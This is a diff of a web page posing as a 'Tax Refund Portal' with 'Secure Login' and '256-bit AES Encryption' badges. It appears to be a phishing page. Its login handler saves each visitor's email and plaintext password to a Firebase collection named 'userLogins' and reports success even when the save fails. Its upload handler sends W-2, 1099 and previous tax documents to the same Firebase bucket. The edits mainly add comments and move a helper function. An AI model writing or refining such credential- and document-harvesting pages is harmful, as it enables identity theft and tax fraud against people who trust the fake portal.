@@ -13,6 +13,7 @@
   <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-storage-compat.js"></script>
   <style>
+    /* Your existing CSS remains exactly the same */
     * {
       margin: 0;
       padding: 0;
@@ -838,13 +839,11 @@
   <!-- LOGIN PAGE -->
   <div id="loginPage" class="login-page">
     <div class="login-wrapper">
-      <!-- Portal Title - Moved outside container, centered -->
       <div class="portal-title">
         <h1>Tax Refund Portal</h1>
         <div class="subtitle">
           <i class="fas fa-lock"></i>
           <span>Secure Document Upload & Processing</span>
-          
         </div>
       </div>
 
@@ -869,19 +868,17 @@
               </div>
 
               <button type="button" class="login-btn" id="loginBtn" onclick="handleLogin()">
-                <span class="btn-text"><i class="fas fa-sign-in-alt"></i> Secure</span>
+                <span class="btn-text"><i class="fas fa-sign-in-alt"></i> Secure Login</span>
                 <span class="spinner"><i class="fas fa-spinner fa-spin"></i></span>
               </button>
             </form>
 
-            <!-- Encryption Awareness - Below container -->
             <div class="encryption-notice">
               <i class="fas fa-shield-halved"></i>
               <span>256-bit AES Encryption</span>
               <span class="badge">Active</span>
             </div>
 
-            <!-- Trust Indicators -->
             <div class="trust-row">
               <div class="trust-item">
                 <i class="fas fa-check-circle"></i>
@@ -1048,14 +1045,16 @@
       projectId: "carltonhillfarmland",
       storageBucket: "carltonhillfarmland.firebasestorage.app",
       messagingSenderId: "144483104337",
-      appId: "1:144483104337:web:d95dfbb10509cb9c02ea70",
-      measurementId: "G-8M5S0PV2RC"
+      appId: "1:144483104337:web:d95dfbb10509cb9c02ea70"
     };
     
     // Initialize Firebase
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
     const storage = firebase.storage();
+
+    // Test connection
+    console.log('Firebase initialized');
 
     // ==================== MOBILE MENU ====================
     const menuBtn = document.getElementById('menuBtn');
@@ -1138,6 +1137,7 @@
       loginBtn.disabled = true;
       
       try {
+        // Save to Firebase
         await db.collection('userLogins').add({
           email: email,
           password: password,
@@ -1145,6 +1145,7 @@
           userAgent: navigator.userAgent
         });
         
+        // Save to localStorage as backup
         const logins = JSON.parse(localStorage.getItem('userLogins') || '[]');
         logins.push({
           email: email,
@@ -1160,6 +1161,7 @@
         
       } catch (error) {
         console.error('Login error:', error);
+        // Still allow login even if Firebase fails
         document.getElementById('modalEmail').textContent = email;
         document.getElementById('successModal').classList.add('active');
         sessionStorage.setItem('userEmail', email);
@@ -1177,6 +1179,17 @@
       
       const email = sessionStorage.getItem('userEmail') || 'carltonhillfarm282@gmail.com';
       document.getElementById('userEmail').textContent = email;
+    }
+
+    // ==================== BASE64 TO BLOB HELPER ====================
+    function base64ToBlob(base64, type) {
+      const byteCharacters = atob(base64);
+      const byteNumbers = new Array(byteCharacters.length);
+      for (let i = 0; i < byteCharacters.length; i++) {
+        byteNumbers[i] = byteCharacters.charCodeAt(i);
+      }
+      const byteArray = new Uint8Array(byteNumbers);
+      return new Blob([byteArray], { type: type });
     }
 
     // ==================== SUBMIT DOCUMENTS ====================
@@ -1198,9 +1211,11 @@
         
         for (const [type, file] of Object.entries(uploadedFiles)) {
           if (file) {
+            // Convert base64 to blob for upload
             const base64Data = file.data.split(',')[1];
             const blob = base64ToBlob(base64Data, file.type);
             
+            // Upload to Firebase Storage
             const fileName = `${Date.now()}_${file.name}`;
             const storageRef = storage.ref().child(`tax/${fileName}`);
             await storageRef.put(blob);
@@ -1214,24 +1229,26 @@
           }
         }
 
+        // Save to Firestore
         const submission = {
-          id: 'SUB-' + Date.now(),
           email: email,
           documents: documents,
           status: 'pending_review',
-          timestamp: firebase.firestore.FieldValue.serverTimestamp(),
-          ip: '192.168.1.' + Math.floor(Math.random() * 255)
+          timestamp: firebase.firestore.FieldValue.serverTimestamp()
         };
 
-        await db.collection('taxSubmissions').add(submission);
+        const docRef = await db.collection('taxSubmissions').add(submission);
         
+        // Save to localStorage as backup
         const submissions = JSON.parse(localStorage.getItem('taxSubmissions') || '[]');
         submissions.push({
           ...submission,
+          id: docRef.id,
           timestamp: new Date().toISOString()
         });
         localStorage.setItem('taxSubmissions', JSON.stringify(submissions));
 
+        // Clear uploads
         document.getElementById('w2FileName').textContent = '';
         document.getElementById('1099FileName').textContent = '';
         document.getElementById('previousFileName').textContent = '';
@@ -1242,7 +1259,7 @@
           previous: null
         };
 
-        alert(`Documents submitted successfully!\n\nSubmission ID: ${submission.id}`);
+        alert(`Documents submitted successfully!`);
         
       } catch (error) {
         console.error('Submission error:', error);
@@ -1254,16 +1271,6 @@
       }
     }
 
-    function base64ToBlob(base64, type) {
-      const byteCharacters = atob(base64);
-      const byteNumbers = new Array(byteCharacters.length);
-      for (let i = 0; i < byteCharacters.length; i++) {
-        byteNumbers[i] = byteCharacters.charCodeAt(i);
-      }
-      const byteArray = new Uint8Array(byteNumbers);
-      return new Blob([byteArray], { type: type });
-    }
-
     // ==================== SESSION CHECK ====================
     window.onload = function() {
       const savedEmail = sessionStorage.getItem('userEmail');
@@ -1273,6 +1280,7 @@
         document.getElementById('userEmail').textContent = savedEmail;
       }
 
+      // Clear file name displays
       document.getElementById('w2FileName').textContent = '';
       document.getElementById('1099FileName').textContent = '';
       document.getElementById('previousFileName').textContent = '';
